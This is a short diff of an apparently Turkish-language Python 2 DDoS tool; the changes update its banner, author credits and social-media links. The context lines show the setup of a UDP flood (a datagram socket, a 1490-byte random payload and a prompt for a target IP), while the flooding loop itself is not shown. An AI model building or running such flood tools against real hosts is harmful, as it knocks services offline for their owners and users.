@@ -17,12 +17,13 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
+os.system("clear") #Bu kısımlara ellemeyin aksi takdirde çalışmaz
 os.system("figlet DDos Saldırısı")
 print
-print "Kod Sahibi   : SakirBey1"
-print "İnstagram : https://www.instagram.com/sakirbey81"
-print "github   : https://github.com/SakirBey1"
+print "Developer SakirBey Vip Tool"
+print "Kod Sahibi   : SakirBey"
+print "İnstagram : https://www.instagram.com/developer.rat"
+print "Github   : https://github.com/SakirBey1"
 print "Telegram : https://t.me/SakirBey1"
 print
 ip = raw_input("IP Giriniz : ")
